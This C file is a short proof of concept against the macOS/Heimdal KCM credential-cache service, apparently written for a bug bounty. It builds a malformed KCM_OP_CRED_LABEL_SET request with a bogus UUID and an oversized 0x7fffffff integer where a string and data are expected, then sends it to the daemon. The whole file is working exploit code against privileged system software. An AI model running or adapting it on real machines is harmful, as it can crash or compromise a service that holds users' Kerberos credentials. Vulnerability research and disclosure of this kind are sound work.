#include <stdio.h>
#include <stdint.h>

typedef enum kcm_operation {
	KCM_OP_NOOP,
	KCM_OP_GET_NAME,
	KCM_OP_RESOLVE,
	KCM_OP_DEPRECATED_GEN_NEW,
	KCM_OP_INITIALIZE,
	KCM_OP_DESTROY,
	KCM_OP_STORE,
	KCM_OP_RETRIEVE,
	KCM_OP_GET_PRINCIPAL,
	KCM_OP_GET_CRED_UUID_LIST,
	KCM_OP_GET_CRED_BY_UUID,
	KCM_OP_REMOVE_CRED,
	KCM_OP_SET_FLAGS,
	KCM_OP_CHOWN,
	KCM_OP_CHMOD,
	KCM_OP_GET_INITIAL_TICKET,
	KCM_OP_GET_TICKET,
	KCM_OP_MOVE_CACHE,
	KCM_OP_GET_CACHE_UUID_LIST,
	KCM_OP_GET_CACHE_BY_UUID,
	KCM_OP_GET_DEFAULT_CACHE,
	KCM_OP_SET_DEFAULT_CACHE,
	KCM_OP_GET_KDC_OFFSET,
	KCM_OP_SET_KDC_OFFSET,
	KCM_OP_RETAIN_KCRED,
	KCM_OP_RELEASE_KCRED,
	KCM_OP_GET_UUID,
	/* NTLM operations */
	KCM_OP_ADD_NTLM_CRED,
	KCM_OP_HAVE_NTLM_CRED,
	KCM_OP_ADD_NTLM_CHALLENGE,
	KCM_OP_DO_NTLM_AUTH,
	KCM_OP_GET_NTLM_USER_LIST,
	/* SCRAM */
	KCM_OP_ADD_SCRAM_CRED,
	KCM_OP_HAVE_SCRAM_CRED,
	KCM_OP_DEL_SCRAM_CRED,
	KCM_OP_DO_SCRAM_AUTH,
	KCM_OP_GET_SCRAM_USER_LIST,
	/* GENERIC */
	KCM_OP_DESTROY_CRED,
	KCM_OP_RETAIN_CRED,
	KCM_OP_RELEASE_CRED,
	KCM_OP_CRED_LABEL_GET,
	KCM_OP_CRED_LABEL_SET,
	/* */
	KCM_OP_CHECK_NTLM_CHALLENGE,
	KCM_OP_GET_CACHE_PRINCIPAL_LIST,
	KCM_OP_MAX
} kcm_operation;

typedef int32_t krb5_error_code;
typedef unsigned char krb5_uuid[16];

struct heim_base_data {
	size_t length;
	void *data;
};

typedef struct heim_base_data heim_octet_string;
typedef heim_octet_string krb5_data;

krb5_error_code krb5_init_context(void* context);
krb5_error_code krb5_kcm_storage_request(void* context, uint16_t opcode, void** storage);
krb5_error_code krb5_store_uuid(void* storage, krb5_uuid uuid);
krb5_error_code krb5_store_int32(void* storage, int32_t len);
krb5_error_code krb5_store_stringz(void* storage, const char* str);
krb5_error_code krb5_store_data(void* storage, krb5_data* data);
krb5_error_code krb5_kcm_call(void* context, void* request, void* response, krb5_data* response_data);

int main(int argc, char** argv)
{
	void* krb_context = NULL;
	krb5_error_code err = 0;

	// set up our connection
	err = krb5_init_context(&krb_context);
	printf("err: %i ctx: %p\n", err, krb_context);

	// set up our malformed message
	void* storage = NULL;
	err = krb5_kcm_storage_request(krb_context, KCM_OP_CRED_LABEL_SET, &storage);
	printf("msg1 err: %i storage: %p\n", err, storage);

	krb5_uuid cred_id = "hiAPPLEplzBOUNTY";
	err = krb5_store_uuid(storage, cred_id);
	err = krb5_store_int32(storage, 0x7fffffff); // put an invalid int instead of a str+data like it's expecting

	// send the message
	void* response = NULL;	
	krb5_data response_data;
	err = krb5_kcm_call(krb_context, storage, &response, &response_data);
	printf("msg1: call err %i\n", err);

	return 0;
}
